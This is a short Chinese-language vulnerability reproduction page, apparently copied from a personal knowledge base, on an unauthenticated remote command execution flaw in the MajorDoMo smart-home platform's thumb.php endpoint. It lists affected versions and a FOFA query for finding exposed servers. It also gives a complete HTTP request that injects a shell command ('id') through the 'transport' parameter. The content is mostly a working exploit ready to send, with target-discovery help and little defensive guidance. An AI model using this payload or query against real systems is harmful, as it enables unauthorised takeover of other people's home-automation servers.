# MajorDoMo thumb未授权RCE漏洞(CNVD-2024-02175)

# 一、漏洞简介
MajorDoMo是MajorDoMo社区的一个开源DIY 智能家居Q自动化平台。MajorDoMo /modules/thumb/thumb.php接口处存在远程命令执行漏洞，未经身份验证的攻击者可利用此漏洞执行任意指令，获取服务器权限。

# 二、影响版本
+ MajorDoMo< 0662e5e

# 三、资产测绘
+ fofa`app="MajordomoSL"`
+ 特征

![1713627397596-ec6aa3a7-c04f-4580-9b3f-5b5aea561b6d.png](./img/2ovjcaHaRtUQroVP/1713627397596-ec6aa3a7-c04f-4580-9b3f-5b5aea561b6d-828706.png)

# 四、漏洞复现
```plain
GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close
```

![1713627778412-e955f94f-c4ec-466d-b9ec-d72be405ea16.png](./img/2ovjcaHaRtUQroVP/1713627778412-e955f94f-c4ec-466d-b9ec-d72be405ea16-632435.png)



> 更新: 2024-04-20 23:45:27  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nlakvnouzm2wkdy4>